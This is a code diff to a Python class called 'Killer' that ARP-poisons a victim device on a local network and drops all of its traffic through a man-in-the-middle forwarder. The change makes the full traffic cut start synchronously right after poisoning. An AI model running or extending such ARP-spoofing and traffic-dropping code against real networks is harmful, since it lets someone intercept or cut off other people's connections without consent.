@@ -238,7 +238,21 @@ class Killer:
         self._poison_arp_now(victim, seq, repeats=3, delay_s=0)
         self._kill_arp_worker(victim, wait_after, seq)
         if not ics_mode:
-            self.apply_traffic_cut(victim)
+            self._apply_traffic_cut_sync(victim)
+
+    def _apply_traffic_cut_sync(self, victim):
+        """Start 100% drop forwarder on the caller thread (Kill must not miss re-arm)."""
+        if not isinstance(victim, dict):
+            return False
+        mac = victim.get('mac')
+        if not mac or mac not in self.killed:
+            return False
+        ok, _reason = self.mitm_prereqs_ok(victim)
+        if not ok:
+            return False
+        self.apply_percent_cut(victim, pass_percent=0)
+        fw = self.forwarders.get(mac)
+        return bool(fw and getattr(fw, 'running', False))
 
     @threaded
     def apply_traffic_cut(self, victim):
@@ -248,15 +262,7 @@ class Killer:
         ARP poison alone is not enough on Windows when IP forwarding is enabled —
         the kernel may still relay frames unless user-space intercepts and drops them.
         """
-        if not isinstance(victim, dict):
-            return
-        mac = victim.get('mac')
-        if not mac or mac not in self.killed:
-            return
-        ok, _reason = self.mitm_prereqs_ok(victim)
-        if not ok:
-            return
-        self.apply_percent_cut(victim, pass_percent=0)
+        self._apply_traffic_cut_sync(victim)
 
     def reassert_poison(self, victim, repeats=3):
         """
